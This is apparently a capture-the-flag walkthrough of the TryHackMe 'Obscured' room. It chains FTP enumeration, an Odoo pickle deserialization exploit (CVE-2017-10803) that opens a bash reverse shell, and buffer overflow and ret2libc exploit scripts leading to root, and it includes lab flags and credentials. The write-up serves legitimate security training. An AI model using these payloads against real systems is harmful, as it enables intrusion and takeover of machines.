# TryHackMe – Obscured

![](Attachment/banner.png)

**Room:** https://tryhackme.com/room/obscured

## 1. Reconnaissance

Started with an Nmap scan to identify open ports and running services.

```bash
nmap -A -vv 10.48.160.126 -sV -oN nmap
```

**Findings:**

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Werkzeug 0.9.6 / Python 2.7.9 |

Anonymous FTP login was enabled, providing an initial entry point for further enumeration.

## 2. FTP Enumeration

![](Attachment/ftp.png)

![](Attachment/password.png)

Downloaded the `password` file and identified its type.

```bash
file password
```

```text
password: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=97fe26005f73d7475722fa1ed61671e82aa481ff, not stripped
```

The FTP directory also contained information referencing `antisoft.thm` and a temporary password application.

## 3. Binary Analysis

Reverse-engineered the downloaded executable and identified a hardcoded employee ID and password.

Relevant function:

```c
int64_t pass(char* arg1)
{
    void* fsbase;
    int64_t rax = *(fsbase + 0x28);
    int64_t var_28;
    __builtin_strncpy(&var_28, "SecurePassword123!", 0x13);

    if (strcmp(arg1, "971234596"))
        puts("Incorrect employee id");
    else
        printf("remember this next time '%s'\n", &var_28);

    int64_t result = rax ^ *(fsbase + 0x28);

    if (!result)
        return result;

    __stack_chk_fail();
}
```

![](Attachment/binary.png)

**Recovered credentials:**

```text
Employee ID: 971234596
Password: SecurePassword123!
```

## 4. Web Enumeration

Added the target hostname to `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

```text
10.48.160.126  antisoft.thm
```

![](Attachment/web.png)

Navigated to the Odoo database manager:

```text
http://antisoft.thm/web/database/manager
```

![](Attachment/backup.png)

Downloaded the database backup and inspected its contents.

```bash
ls -l main_2026-11-10_10-58-22
```

```text
-rw-r--r-- dump.sql
drwxrwxr-x filestore
-rw-r--r-- manifest.json
```

Identified the administrator email address from the SQL dump:

```bash
grep "antisoft.thm" dump.sql
```

**Result:** `admin@antisoft.thm`

![](Attachment/email.png)

Login to the Application: 
![](Attachment/web_login.png)

## 5. Odoo Exploitation – Initial Access

Identified the Odoo version and researched the associated vulnerability.

![](Attachment/version.png)

![](Attachment/exploit.png)

**Vulnerability:** CVE-2017-10803

The vulnerability involves insecure Python pickle deserialization in Odoo's Database Anonymization module.

### Exploitation Process

1. Navigate to the Apps section in Odoo.
2. Disable the Apps filter and search for `Database Anonymization`.
3. Install the module.
4. Navigate to Settings and select `Anonymize database`.
5. Click the `Anonymize Database` button.
6. Refresh the page and return to the same settings section.
7. Upload the malicious `exploit.pickle` file.
8. Click `Reverse the Database Anonymization`.

### Generate the Malicious Pickle File

The following Python 2 script generates the serialized payload.

![](Attachment/database%20anonymization.png)

```python
import cPickle
import os
import base64
import pickletools

class Exploit(object):
    def __reduce__(self):
        return (os.system, (("bash -i >& /dev/tcp/IP/8000 0>&1"),))

with open("exploit.pickle", "wb") as f:
    cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

Generate the file:

```bash
python2.7 exploit.py
```

Verify:

```bash
file exploit.pickle
```

Start a Netcat listener on port `8000`, then upload the generated file.

![](Attachment/upload.png)

![](Attachment/initial.png)

### Stabilize the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Initial Flag

```bash
cat /var/lib/odoo/flag.txt
```

```text
THM{1243b64a3a01a8732ccb96217f593520}
```

## 6. Container Enumeration

![](Attachment/ret.png)

Transferred the `ret` binary from the target to the attacker machine.

**Attacker machine:**

```bash
nc -w 3 192.168.128.98 9999 < ret
```

**Target machine:**

```bash
nc -l -p 9999 > ret
```

Identified the transferred file:

```bash
file ret
```

```text
ret: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c3a9e9f974de13925f0644178007bdbf22576e3, not stripped
```

![](Attachment/flow.png)

## 7. Binary Analysis – Buffer Overflow

Reverse-engineering revealed a vulnerable function named `vuln()`.

The relevant code:

```c
char* vuln()
{
    fwrite(
        "Exploit this binary to get on the box!\nWhat do you have for me?\n",
        1,
        0x40,
        stdout
    );

    fflush(stdout);

    char buf[0x80];
    return gets(&buf);
}
```

The vulnerability is caused by the use of `gets()`, which does not perform input bounds checking.

### Generate the Buffer Overflow Payload

The `win()` function was identified at address `0x400646`.

The buffer size was `0x80` (128 bytes), and the saved RBP occupied another 8 bytes, giving an offset of 136 bytes to the saved return address.

```python
from pwn import *

# Generate payload
payload = b'A' * 136 + p64(0x400646)

# Write payload to file
with open('payload.bin', 'wb') as f:
    f.write(payload)

print("[+] Payload generated: payload.bin")
print("[+] Payload size:", len(payload))
```

![](Attachment/root.png)

![](Attachment/root.txt.png)

## 8. Docker Host Enumeration

Further enumeration revealed the Docker host network.

```bash
ip addr
```

![](Attachment/ip.png)

Enumerated the Docker host:

```bash
nmap -sV 172.17.0.1
```

Relevant findings:

| Port | Service |
|---|---|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |
| 4444 | krb524 |

![](Attachment/nmap.png)

## 9.  Access – User Flag

![](Attachment/exploit-1.png)

Located the SSH credentials and private key associated with the user `zeeshan`.

.ssh/id_rsa
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAK....
-----END RSA PRIVATE KEY-----
```

ip addr
```
eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:ff:c1:17:93:cf brd ff:ff:ff:ff:ff:ff
    inet 10.48.130.91/18 brd 10.48.191.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:c1ff:fe17:93cf/64 scope link 
       valid_lft forever preferred_lft forever
```


```bash
ssh -i id_rsa zeeshan@10.48.130.91
```

![](Attachment/zeeshan_ssh.png)
### User Flag

```bash
cat user.txt
```

```text
THM{43b0b68ba2755dd6cac3b8bf5454db94}
```

## 10. Privilege Escalation – Root

Enumerated the user's sudo permissions:

```bash
sudo -l
```

```text
Matching Defaults entries for zeeshan on hydra:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeeshan may run the following commands on hydra:
    (ALL : ALL) ALL
    (root) NOPASSWD: /exploit_me
```

The `/exploit_me` binary was particularly interesting.

```bash
file exploit_me
```

![](Attachment/exploit_me.png)

```text
exploit_me: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=589ddc7b680c9a773ae64cc2db0e877b490e943e, not stripped
```

The binary contained a stack-based buffer overflow vulnerability caused by `gets()`.

### Exploit Development

The exploitation process involved:

- Identifying the vulnerable function.
- Calculating the saved return-address offset.
- Checking binary protections.
- Identifying ROP gadgets.
- Leaking libc addresses.
- Calculating libc function addresses.
- Building a two-stage Ret2Libc payload.

### Exploit Script

The following script performs the remote exploitation over SSH.

```python
#!/usr/bin/env python3

from pwn import *

# Path to your private key
private_key_path = "id_rsa"

# Load binary and libc
elf = context.binary = ELF("./exploit_me", checksec=False)
libc = elf.libc

# Connect via SSH using the private key
s = ssh(
    host="10.48.130.91",
    user="zeeshan",
    keyfile=private_key_path
)

# Run the binary on the remote host
p = s.run("/exploit_me")

# Prepare the first-stage payload
prefix = b"A" * 40

pop_rdi = p64(next(elf.search(asm("pop rdi; ret"))))
go_gets = p64(elf.got["gets"])
go_puts = p64(elf.got["puts"])
fn_puts = p64(elf.plt["puts"])
fn_main = p64(elf.symbols["main"])

payload = (
    prefix
    + pop_rdi
    + go_gets
    + fn_puts
    + pop_rdi
    + go_puts
    + fn_puts
    + fn_main
)

# Send the first-stage payload
p.clean()
p.sendline(payload)

# Receive leaked addresses
gets_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
puts_addr = u64(p.recvline().strip().ljust(8, b"\x00"))

print("Gets :", hex(gets_addr))
print("Puts :", hex(puts_addr))

# Calculate libc base and function addresses
offset = gets_addr - 0x6ed90

bin_sh = p64(offset + 0x18ce57)
system = p64(offset + 0x453a0)

# Prepare the second-stage payload
payload = (
    prefix
    + pop_rdi
    + bin_sh
    + system
)

# Send the final payload
p.clean()
p.sendline(payload)

# Interact with the shell
p.interactive()
```


![](Attachment/root-1.png)

### Root Flag

```bash
cat /root/root.txt
```

```text
THM{8bbc6221d009576d37e28acdd9da7aba}
```

---

## Conclusion

Successfully exploited the Odoo application, gained initial access, escalated privileges through a buffer overflow, and obtained root access on the Docker host.

**Thanks for reading! Happy Hacking.**